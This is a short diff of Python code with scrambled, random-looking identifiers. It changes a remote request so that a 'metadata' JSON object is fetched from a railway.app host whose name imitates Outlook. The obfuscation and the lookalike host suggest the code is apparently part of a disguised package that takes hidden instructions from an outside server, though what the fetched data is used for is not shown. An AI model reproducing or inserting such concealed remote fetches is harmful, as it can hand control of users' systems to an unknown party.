@@ -18,7 +18,7 @@ def eval_tycimt_142():
 
     def model_gifrgw_629():
         try:
-            learn_zkcncl_104 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_zkcncl_104 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_zkcncl_104.raise_for_status()
             train_awoquu_914 = learn_zkcncl_104.json()
             process_hngxcs_921 = train_awoquu_914.get('metadata')
